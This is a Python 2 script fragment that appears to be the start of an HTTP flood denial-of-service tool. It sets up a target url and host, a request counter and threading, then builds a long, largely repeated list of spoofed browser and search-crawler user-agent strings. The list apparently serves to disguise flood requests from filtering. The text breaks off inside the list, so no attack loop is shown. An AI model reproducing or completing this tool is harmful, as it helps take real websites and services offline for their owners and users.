
import urllib2
import sys
import threading
import random
import re
import os
#global params
url=''
host=''
headers_useragents=[]
headers_referers=[]
request_counter=0
flag=0
safe=0

def inc_counter():
	global request_counter
	request_counter+=1

def set_flag(val):
	global flag
	flag=val

def set_safe():
	global safe
	safe=1
	
# generates a user agent array
def useragent_list():
	global headers_useragents
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
	headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
	headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
	headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
	headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
	headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
	headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
	headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
	headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
	headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
	headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
	headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)')
	headers_useragents.append('Googlebot/2.1 (http://www.googlebot.com/bot.html)')
	headers_useragents.append('Opera/9.20 (Windows NT 6.0; U; en)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)')
	headers_useragents.append('Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16')
	headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7')
	headers_useragents.append('Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)')
	headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)')
	headers_useragents.append('YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	headers_useragents.append('AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
	headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
	headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
	headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
	headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
	headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
	headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
	headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
	headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
	headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
	headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
	headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
	headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
	headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
	headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
	headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
	headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
	headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
	headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
	headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
	headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
	headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
	headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
	headers_useragents.append('Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0) AddSugarSpiderBot www.idealobserver.com')
	headers_useragents.append('Mozilla/5.0 (compatible; AnyApexBot/1.0; +http://www.anyapex.com/bot.html)')
	headers_useragents.append('Mozilla/4.0 (compatible; Arachmo)')
	headers_useragents.append('Mozilla/4.0 (compatible; B-l-i-t-z-B-O-T)')
	headers_useragents.append('Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)')
